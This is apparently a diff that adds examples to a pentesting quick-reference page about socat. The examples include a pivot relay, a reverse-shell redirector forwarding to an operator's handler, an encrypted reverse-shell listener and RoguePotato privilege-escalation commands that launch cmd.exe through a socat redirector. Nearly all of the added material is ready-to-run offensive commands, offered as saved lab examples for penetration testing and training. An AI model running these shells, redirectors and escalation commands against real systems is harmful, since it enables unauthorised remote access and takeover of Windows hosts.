@@ -13,6 +13,64 @@ keywords: ["socat", "tcp relay", "redirector", "listener", "port forwarding", "r
 
 {/* Generated from Tools/Quick Reference/socat.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## socat: choose the operation and read the result
+
+Relay connections between two endpoints.
+
+### What the result establishes
+
+Identify both address specifications: one receives or reads, the other connects or writes.
+
+### Prerequisites and common failures
+
+Listener placement, EXEC versus file output, PTY options and byte-stream behavior are distinct; a malformed address can silently select the wrong direction.
+
+### Example 1: Commands
+
+Run in: **Pivot host**.
+
+```bash
+socat TCP-LISTEN:8080,fork TCP:TARGET_IP:80
+```
+
+### Example 2: socat: Relays and Shell Redirectors
+
+Run in: **Saved lab example**.
+
+```bash
+# relay: anything hitting the pivot's :8080 → forwarded to internal target :80
+socat TCP-LISTEN:8080,fork TCP:172.16.5.5:80
+# reverse-shell redirector: pivot listens :8080, forwards to YOUR handler :80
+socat TCP-LISTEN:8080,fork TCP:10.10.14.18:80
+# fully-encrypted reverse shell (attacker)
+socat -d -d OPENSSL-LISTEN:4443,cert=shell.pem,verify=0,fork STDOUT
+```
+
+Saved context: [socat: Relays and Shell Redirectors — socat: Relays and Shell Redirectors](/tools/socat). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Rogue Potato (Fake OXID Resolver)
+
+Run in: **Saved lab example**.
+
+```powershell
+# Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
+socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
+
+# RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. 
+# Use this if you have fw restrictions.
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
+
+# RoguePotato all in one with RogueOxidResolver running locally on port 9999
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
+
+#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
+```
+
+Saved context: [Windows Privilege Escalation: Full Checklist — Rogue Potato (Fake OXID Resolver)](/privesc/windows-privesc-checklist#rogue-potato-fake-oxid-resolver). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Existing notes and worked examples
+
 A dumb bidirectional relay — no SSH, no auth. Great as a **redirector** on a pivot, or to catch/forward a shell through one.
 
 ```bash
